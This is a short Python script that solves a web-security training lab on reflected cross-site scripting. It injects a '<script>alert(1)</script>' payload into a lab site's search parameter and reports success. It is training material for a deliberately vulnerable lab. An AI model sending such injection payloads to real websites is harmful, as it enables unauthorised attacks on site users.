########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 14/11/2023
#
# Lab: Reflected XSS into HTML context with nothing encoded
#
# Steps: 1. Inject payload in the search query parameter to call the alert function
#        2. Observe that the script has been executed
#
########################################################################################


###########
# imports
###########
import requests
from colorama import Fore


#########
# Main
#########

# change this to your lab URL
url = "https://0afc003703efec5581123e66003300f4.web-security-academy.net"

# payload to call the alert function
payload = "<script>alert(1)</script>"

try:
    # fetch the page with the injected payload
    requests.get(f"{url}?search={payload}")

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Injecting payload in the search query parameter to call the alert function.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



